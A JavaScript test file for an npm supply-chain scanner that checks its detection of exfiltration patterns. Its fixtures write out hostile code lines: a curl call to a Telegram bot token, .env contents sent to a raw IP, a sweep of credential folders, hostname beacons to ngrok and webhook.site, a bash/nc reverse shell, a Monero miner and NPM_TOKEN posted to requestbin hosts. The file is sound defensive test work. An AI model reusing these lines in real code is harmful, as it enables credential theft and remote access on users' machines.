// 0.1.8: the exfiltration shapes in the npm engine — a chat bot or webhook
// whose secret is written in the code, credential files sent to a raw IP
// address, a sweep of credential folders, the host name sent to a hidden
// address or in a DNS name, the public IP address sent to a capture service,
// a copy of the environment serialized, a reverse shell as an argument list,
// a miner, a raw socket and rewritten browser shortcuts at install time.
// Twin of python/tests/scanner/test_exfiltration_shapes.py; on a random
// corpus the engines are held to each other by
// tests/architecture/test_js_parity_hooks.py. The secrets are fake and built
// here; hosts are .invalid or TEST-NET; nothing is executed.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { run, installScriptRisk, importTimeRisk, importTimeSeverity } from "../src/index.js";
import { chatSecretAt, credentialSweepAt, minerAt, rawIpConnect } from "../src/lib/hooks.js";

const TG = "1234567" + "89:AA" + "bC3dE5fG7hJ9kL1mN3pQ5rS7tV9wX1yZ3";
const SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuVwX";
const XMR = "4" + "AbCdEfGhJk".repeat(10).slice(0, 94);
const onImport = (text, lang = "js") => {
  const [reasons] = importTimeRisk(text, lang);
  return [reasons, reasons.length ? importTimeSeverity(reasons) : null];
};

test("a chat bot or webhook whose secret is in the code", () => {
  const bot = "const { exec } = require('child_process');\nconst T = '" + TG + "';\n"
    + "exec(`curl -s \"https://api.telegram.org/bot${T}/sendMessage?chat_id=1&text=${t}\"`);\n";
  assert.deepEqual(onImport(bot), [["sends data to a Telegram bot whose token is written in the code (bot 123456789)"], "CRITICAL"]);
  assert.deepEqual(onImport("var webhookUrl = 'https://" + SLACK + "';\nawait fetch(webhookUrl, {});\n"),
    [["sends data to a Slack webhook whose key is written in the code (TABCDEF12)"], "CRITICAL"]);
  // the user's token, a placeholder, no network call
  assert.equal(chatSecretAt("const t = process.env.TG;\nfetch(`https://api.telegram.org/bot${t}/getMe`);\n"), null);
  assert.equal(chatSecretAt("fetch('https://hooks.slack.com/services/T00000000/B00000000/" + "X".repeat(24) + "');\n"), null);
  assert.equal(chatSecretAt("const T = '" + TG + "'; // https://api.telegram.org\n"), null);
});

test("credentials: files sent to an IP address, a sweep of folders", () => {
  const hrp = "const fs = require('fs');\nconst https = require('https');\nconst d = fs.readFileSync('.env', 'utf8');\n"
    + "https.get(`https://203.0.113.9:8855/1?data=${encodeURIComponent(d)}`);\n";
  assert.deepEqual(onImport(hrp), [["reads credential files and sends data to an IP address (203.0.113.9)"], "CRITICAL"]);
  assert.deepEqual(onImport(hrp.replace("203.0.113.9", "10.0.0.9"))[0], []);
  const sweep = "const https = require('https');\nconst DIRS = ['.ssh', '.aws', '.ethereum', '.kube'].map((d) => join(home, d));\n";
  assert.deepEqual(credentialSweepAt(sweep), [sweep.indexOf("'.ssh'"), ["ssh", "aws", "ethereum", "kube"]]);
  assert.equal(importTimeSeverity(onImport(sweep)[0]), "CRITICAL");
  assert.equal(credentialSweepAt("const PATHS = ['.ssh', '.aws'];\n"), null);
});

test("the machine's names and address sent out", () => {
  const dns = "const dns = require('dns');\nconst os = require('os');\ndns.lookup(`${os.hostname()}.c.x.invalid.com`, cb);\n";
  assert.deepEqual(onImport(dns), [["sends the machine's user or host name in a DNS lookup of a name it builds"], "CRITICAL"]);
  const tunnel = "const { exec } = require('child_process');\n"
    + "exec(`curl -X POST \"https://7195e44e.ngrok-free.app/t/$(whoami)/$(hostname)/\"`, () => {});\n";
  assert.deepEqual(onImport(tunnel),
    [["sends the machine's user or host name to a data-capture service (7195e44e.ngrok-free.app)"], "CRITICAL"]);
  const ip = "const ip = await (await fetch('https://api.ipify.org')).text();\n"
    + "await fetch('https://webhook.site/0000', { method: 'POST', body: ip });\n";
  assert.deepEqual(onImport(ip), [["sends the machine's public IP address to a data-capture service (webhook.site)"], "CRITICAL"]);
  assert.deepEqual(onImport("const c = await (await fetch('https://ipinfo.io/json')).json();\nfetch(MIRRORS[c.country]);\n")[0], []);
});

test("reverse shells as argument lists, miners, raw sockets and shortcuts at install time", () => {
  assert.deepEqual(onImport("const { spawn } = require('child_process');\nspawn('bash', ['-i', 'nc', '2.tcp.eu.ngrok.io', '12151']);\n"),
    [["opens a reverse shell"], "CRITICAL"]);
  const miner = "const cp = require('child_process');\ncp.spawn(path, ['-u', '" + XMR + "', '-o', 'pool.x.invalid:8080']);\n";
  assert.equal(minerAt(miner), miner.indexOf(XMR));
  assert.equal(minerAt("const ADDRESS = '" + XMR + "';\n"), -1);
  const sock = "const net = require('net');\nconst ip = '203.0.113.5';\nconst s = net.connect(12345, ip);\n";
  assert.equal(rawIpConnect(sock), "203.0.113.5");
  assert.ok(installScriptRisk(sock).includes("contacts an address typical of data exfiltration (203.0.113.5)"));
  assert.equal(rawIpConnect(sock.replace("203.0.113.5", "127.0.0.1")), null);
  assert.equal(rawIpConnect(sock.replace("203.0.113.5", "8.8.8.8")), null);
  const lnk = "const s = shell.CreateShortcut(p + '.lnk');\ns.Arguments = '--load-extension=' + ext;\ns.Save();\n";
  assert.ok(installScriptRisk(lnk).includes("rewrites browser shortcuts to load an extension"));
});

test("hostile inputs finish fast", () => {
  const texts = {
    tokens: "import requests\napi.telegram.org\n" + ("'123456789:AA" + "A".repeat(33) + "', ").repeat(20000),
    "ip literals": "connect\n" + "'203.0.113.7', ".repeat(50000),
    "credential folders": "import requests\n" + "'.ssh', x, ".repeat(30000),
    "environment copies": "import os\n" + "e = dict(os.environ)\n".repeat(20000) + "x" + " ".repeat(100000),
    "dns lookups": "import socket\nsocket.gethostname()\n" + ("getaddrinfo(f'{a}" + "b".repeat(200) + "', 1)\n").repeat(5000),
    "reverse shell args": "'nc'" + " '-x',".repeat(50000),
    monero: "'-o' exec(" + ("4" + "a".repeat(93) + "! ").repeat(5000),
    "a long line": 'getaddrinfo(f"' + "{a}.".repeat(50000) + "\n",
  };
  for (const [label, text] of Object.entries(texts)) {
    const start = performance.now();
    importTimeRisk(text, "py");
    installScriptRisk(text);
    assert.ok(performance.now() - start < 5000, label);
  }
});

test("--deps: a dependency whose main posts to a Slack webhook in its code", () => {
  const files = {
    "package.json": JSON.stringify({ name: "app", version: "1.0.0" }),
    "node_modules/fp/package.json": JSON.stringify({ name: "fp", version: "1.0.9", main: "dist/index.js" }),
    "node_modules/fp/dist/index.js": "var webhookUrl = 'https://" + SLACK + "';\n"
      + "async function send(m) { await fetch(webhookUrl, { method: 'POST', body: m }); }\nmodule.exports = { send };\n",
  };
  const root = mkdtempSync(join(tmpdir(), "lz-exfil-"));
  const out = mkdtempSync(join(tmpdir(), "lz-exfil-out-"));
  try {
    for (const [rel, data] of Object.entries(files)) {
      mkdirSync(dirname(join(root, rel)), { recursive: true });
      writeFileSync(join(root, rel), data);
    }
    run(["check", root, "--deps", "--out-dir", out, "--no-html", "--quiet"], { out: () => {}, err: () => {}, env: {} });
    const rep = JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
    const got = rep.issues.filter((i) => i.rule === "SC-IMPORT-RISK").map((i) => [i.file.replaceAll("\\", "/"), i.sev]);
    assert.deepEqual(got, [["node_modules/fp/dist/index.js", "CRITICAL"]]);
  } finally {
    rmSync(root, { recursive: true, force: true });
    rmSync(out, { recursive: true, force: true });
  }
});

test("RequestBin by its host names only: requestBinary() is not an address", () => {
  // chromedriver's and phantomjs-prebuilt's installers define requestBinary()
  // to download their binaries (Python twin: RequestBinTests)
  const installer = "const request = require('request');\n"
    + "function requestBinary(requestOptions, filePath) {\n"
    + "  return new Promise((resolve) => request(requestOptions).pipe(fs.createWriteStream(filePath)));\n}\n"
    + "requestBinary(getRequestOptions(), downloadedFile).then(extractDownload);\n";
  assert.deepEqual(installScriptRisk(installer), []);
  for (const host of ["requestbin.com", "enx1.x.requestbin.net", "requestbin.io", "requestb.in"]) {
    const text = `const https = require('https');\nhttps.get('https://${host}/r/abc?d=' + process.env.NPM_TOKEN);\n`;
    assert.deepEqual(installScriptRisk(text),
      [`contacts an address typical of data exfiltration (${host.split("x.").pop()})`], host);
  }
  const beacon = "import socket, requests\nrequests.post('https://requestbin.net/r/abc', data=socket.gethostname())\n";
  assert.deepEqual(onImport(beacon, "py"),
    [["sends the machine's user or host name to a data-capture service (requestbin.net)"], "CRITICAL"]);
});
